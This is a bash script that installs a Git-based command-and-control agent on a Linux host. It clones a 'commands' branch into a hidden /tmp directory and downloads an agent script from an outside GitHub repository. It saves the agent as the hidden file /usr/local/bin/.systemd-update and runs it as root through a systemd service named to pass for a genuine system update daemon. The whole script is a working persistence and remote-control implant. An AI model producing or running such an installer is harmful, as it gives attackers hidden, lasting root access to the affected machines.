#!/bin/bash

# Define Variables
REPO_USER="repo user"
REPO_NAME="git-c2"
REPO_URL="https://github.com/$REPO_USER/$REPO_NAME.git"
BRANCH="commands"
LOCAL_DIR="/tmp/.cache/.git_c2"
AGENT_SCRIPT="/usr/local/bin/.systemd-update"
SERVICE_FILE="/etc/systemd/system/systemd-update.service"
AGENT_URL="https://github.com/$REPO_USER/$REPO_NAME/blob/main/agent.sh?raw=true"

# Install Dependencies
echo "[*] Installing necessary dependencies..."
sudo apt-get update -y
sudo apt-get install -y git wget

# Clone Git repository if not already there
echo "[*] Cloning Git repository..."
mkdir -p "$LOCAL_DIR"
cd "$LOCAL_DIR"

if [ ! -d "$LOCAL_DIR/.git" ]; then
    git clone --depth=1 --branch "$BRANCH" "$REPO_URL" .
fi

# Download the Agent Script
echo "[*] Downloading the agent script..."
wget -q "$AGENT_URL" -O "$AGENT_SCRIPT"

# Make the Agent Script Executable
echo "[*] Making the agent script executable..."
sudo chmod +x "$AGENT_SCRIPT"

# Set Up the systemd Service
echo "[*] Creating systemd service..."

cat << EOF | sudo tee "$SERVICE_FILE"
[Unit]
Description=Systemd Update Daemon
After=network.target

[Service]
ExecStart=$AGENT_SCRIPT
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 6: Enable and Start the systemd Service
echo "[*] Enabling and starting systemd service..."
sudo systemctl daemon-reload
sudo systemctl enable systemd-update
sudo systemctl start systemd-update

# Step 7: Confirm service status
echo "[*] Verifying service status..."
sudo systemctl status systemd-update --no-pager

echo "[*] Installation Complete. Agent is now running as a systemd service."
